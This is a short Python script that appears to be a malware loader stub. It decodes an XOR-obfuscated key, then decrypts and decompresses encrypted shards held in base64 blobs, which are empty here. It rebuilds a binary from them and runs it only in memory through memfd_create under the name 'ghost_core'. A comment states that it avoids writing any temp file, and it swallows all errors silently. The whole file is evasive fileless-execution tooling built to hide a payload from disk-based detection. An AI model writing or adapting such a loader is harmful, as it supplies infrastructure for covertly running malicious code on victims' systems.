import os,sys,base64,zlib,subprocess,struct,time,ctypes
P=""
KP=""
def _get_fk(): return bytes([x ^ 85 for x in [34, 59, 44, 50, 47, 112, 127, 56, 110, 105, 104, 98, 18, 8, 22, 54, 116, 22, 36, 96, 38, 61, 123, 28, 54, 109, 28, 102, 22, 13, 23, 45, 56, 98, 98, 53, 108, 116, 31, 108, 107, 63, 41, 48, 9, 58, 103, 7, 57, 3, 126, 109, 34, 48, 49, 98, 23, 125, 8, 50, 60, 119, 127, 105]])
def _rx(d, k):
 l=len(k);r=bytearray()
 for i,b in enumerate(d):r.append(b^k[i%l]^k[(i+1)%l])
 return bytes(r)

def _mem_run(bin_data):
 try:
  libc = ctypes.CDLL("libc.so")
  fd = libc.memfd_create(b"ghost_core", 1)
  if fd == -1: return False
  os.write(fd, bin_data)
  path = "/proc/self/fd/" + str(fd)
  proc = subprocess.Popen([path]+sys.argv[1:])
  try: os.close(fd)
  except: pass
  proc.wait()
  return True
 except: return False

def _ghost_run():
 try:
  FK=_get_fk()
  kd=zlib.decompress(_rx(base64.b64decode(KP),FK))
  off=0;sks=[]
  while off<len(kd):
   l=struct.unpack("<I",kd[off:off+4])[0];off+=4
   sks.append(kd[off:off+l]);off+=l
  pd=zlib.decompress(_rx(base64.b64decode(P),FK))
  off=0;shs=[]
  for i in range(len(sks)):
   if off+4>len(pd):break
   l=struct.unpack("<I",pd[off:off+4])[0];off+=4
   enc=pd[off:off+l];off+=l
   shs.append(zlib.decompress(_rx(enc,sks[i])))
  full_bin=b"".join(shs)
  _mem_run(full_bin)  # RAM-only (memfd). No temp file fallback.
 except Exception:pass
if __name__=="__main__":_ghost_run()
